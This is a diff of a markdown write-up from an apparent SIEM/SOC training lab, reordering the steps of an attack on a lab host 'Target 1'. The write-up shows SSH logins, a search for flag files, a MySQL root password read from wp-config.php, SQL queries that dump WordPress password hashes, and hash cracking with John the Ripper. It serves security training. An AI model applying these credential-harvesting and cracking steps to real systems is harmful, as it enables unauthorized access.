@@ -42,7 +42,6 @@ In this environment the Kali Linux machine is the attacking machine. The ELK ser
 
 
 
-
 ## Offensive Security - Target 1 ##
 
 The objective of the offensive SIEM engineering team is to identify critical vulnerabilities in the system and exploit them. Documention of these vulnerabilities is reported to the SOC team. 
@@ -101,21 +100,22 @@ What did the exploit achieve?
 ![image](https://github.com/duffian/SIEM_SOC/blob/a89a67f44005945181d2897d97e6466921eec59a/images/11_hydra.png) 
 
 ***Exploitation - SSH Access to Target 1***
+
 What tool or technique did you use to exploit the vulnerability?
 >ssh login
 
 >directory exploration
 
-What did the exploit achieve?
->Unauthorized access to the Target 1 machine was achieved by using the unsecured ssh port and login information uncovered in previous steps. 
-
->Access to Target 1 system and identification of `Flag 2`
-
 `ssh michael@192.168.1.110`
 
 ![image](https://github.com/duffian/SIEM_SOC/blob/b1ad487330827e1fdd4a7fa298a8a63e6a605ca5/images/8_sshmichael.png)
 
+What did the exploit achieve?
+
+>Access to Target 1 system and identification of `Flag 2`
+
 `$ cd /`
+
 `$ find /*/*/*flag*`
 
 ![image](https://github.com/duffian/SIEM_SOC/blob/d05256b4b6be3184bda24796e6b3c9d5f70c1360/images/advanced_offense/1_xtraflag2.png)
@@ -140,8 +140,6 @@ What did the exploit achieve?
 
 ![image](https://github.com/duffian/SIEM_SOC/blob/a103305b127bdd8a0fabde5f6cd37475758b63f9/images/advanced_offense/14_mysql_db_user_pword.png)
 
-![image](https://github.com/duffian/SIEM_SOC/blob/a89a67f44005945181d2897d97e6466921eec59a/images/13_pe.png)
-
 `cat service.html | grep flag*`
 
 ![image](https://github.com/duffian/SIEM_SOC/blob/d05256b4b6be3184bda24796e6b3c9d5f70c1360/images/advanced_offense/5_flag1.png)
@@ -151,18 +149,22 @@ What did the exploit achieve?
 What tool or technique did you use to exploit the vulnerability?
 >Login credentials for MySQL server found in `/var/www/html/wordpress/wp-config.php` file used.
 
-What did the exploit achieve?
->Root access to MySQL system and identification of `Flag 3` and `Flag 4` in MySQL'wp_posts'
-
->Identification of user 'michael' and user 'steven' password hashes
 
 `$ mysql -u root -p'R@v3nSecurity' -h 127.0.0.1`
 
 ![image](https://github.com/duffian/SIEM_SOC/blob/a103305b127bdd8a0fabde5f6cd37475758b63f9/images/advanced_offense/16_mysql_loggedin.png)
 
+What did the exploit achieve?
+>Root access to MySQL system and identification of `Flag 3` and `Flag 4` in MySQL'wp_posts'
+
+>Identification of user 'michael' and user 'steven' password hashes
+
 `mysql> show databases;`
+
 `mysql> use wordpress;`
+
 `mysql> show tables;`
+
 `mysql> select * from wp_posts;`
 
 ![image](https://github.com/duffian/SIEM_SOC/blob/2cdd578b781ed32fa03e41b044f63cc535dfaed7/images/advanced_offense/mysqlf3f4_a.png)
@@ -174,8 +176,11 @@ What did the exploit achieve?
 ![image](https://github.com/duffian/SIEM_SOC/blob/2cdd578b781ed32fa03e41b044f63cc535dfaed7/images/advanced_offense/2_flag4Untitled.png) 
 
 `mysql> show databases;`
+
 `mysql> use wordpress;`
+
 `mysql> show tables;`
+
 `mysql> SELECT ID, user_login, user_pass FROM wp_users;`
 
 ![image](https://github.com/duffian/SIEM_SOC/blob/ae9ec123f0fdf1b005aaff2c34b09054e32f2d98/images/advanced_offense/mysql_userhashes.png)
@@ -189,20 +194,21 @@ What tool or technique did you use to exploit the vulnerability?
 
 >Python shell script
 
-What did the exploit achieve?
->Cracked password hashes
-
->Root access
-
->Location of Flag 4
-
 Create `wp_hashes.txt` file containing each user password hash and run John the Ripper. 
 
 `john wp_hashes.txt`
   -  username: steven
   -  password: pink84
 
+What did the exploit achieve?
+>User 'steven' login credentials
+
+>Root access
+
+>Location of Flag 4
+
 `$ ssh steven@192.168.1.110`
+
 `pink84`
 
 ![image](https://github.com/duffian/SIEM_SOC/blob/1c2d0c98aaa054c1f6c095e1178c749ff8227d66/images/advanced_offense/stevenssh.png)
